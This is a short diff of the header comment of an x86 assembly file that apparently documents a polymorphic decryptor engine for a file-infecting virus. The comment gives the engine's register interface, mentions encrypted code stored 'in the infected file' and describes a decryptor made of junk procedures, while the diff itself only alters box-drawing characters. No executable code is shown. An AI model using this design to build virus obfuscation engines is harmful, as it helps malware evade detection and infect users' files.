@@ -23,21 +23,21 @@ MAX_POLY_SIZE   equ 3072
 ;                ÄÄÄÄÄÄÄÄ¿ this is the RVA of an empty space in (un-
 ;                         initialized data or padding space). the junk
 ;                         instructions will write to this area
-;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 ;
 ;                EBX  = address of code to decrypt
 ;                ÄÄÄÄÄÄÄÄ¿ this is the RVA where the encrypted
 ;                         code will be stored in the infected file.
-;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 ;
 ;                ECX  = size of code to encrypt (in dwords)
-;                ESI Ä code to encrypt
-;                EDI Ä area >= 2kb to store the decryptor
+;                ESI  code to encrypt
+;                EDI  area >= 2kb to store the decryptor
 ;
 ; returns:       the registers aren't changed except ECX that contains
 ;                the size of the poly decryptor!
 ;
-; NOTE: 'Ä' is equal to 'points to'
+; NOTE: '' is equal to 'points to'
 ;
 ; the decryptor constists of junk procedures, decryptor procedures, main
 ; loop calling the procedures and finally jump to the start address to the
